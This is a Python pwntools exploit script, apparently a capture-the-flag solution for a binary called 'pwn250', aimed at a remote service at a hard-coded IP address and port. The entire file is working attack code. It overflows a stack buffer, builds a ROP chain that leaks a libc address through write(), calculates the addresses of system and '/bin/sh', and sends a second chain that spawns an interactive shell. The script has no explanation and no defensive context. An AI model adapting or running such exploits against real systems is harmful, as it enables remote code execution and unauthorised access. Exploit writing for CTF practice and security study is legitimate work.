#!/usr/bin/python
from pwn import *

elf = ELF("./libc.so")
#p = process("./pwn250",env={"LD_PRELOAD":"./libc.so"})
p = remote("54.153.19.139",5255)
#raw_input()



pop_rdi = 0x000000000040056a

pop_rdx = 0x000000000040056c

buf = "A"*136
buf += p64(pop_rdx)
buf += p64(0x800)
buf += p64(0x400585)	# read().

payload = "C"*(200-40-8)
# ROP start.
payload += p64(pop_rdi)
payload += p64(0x1)
payload += p64(0x0000000000601018)
payload += p64(0x8)
# Write()
payload += p64(0x40042c)
payload += p64(0x400571)


p.sendline(buf)
sleep(0.1)
p.sendline(payload)
libc = u64(p.recv())
base = libc - elf.symbols['write']
log.success("Libc: " + hex(base))
system_addr = base + elf.symbols['system']
sh_addr = base + 0x3eb83c

finale = "X"*136
finale += p64(0x0000000000400633)
finale += p64(sh_addr)
finale += p64(system_addr)
p.sendline(finale)

p.interactive()
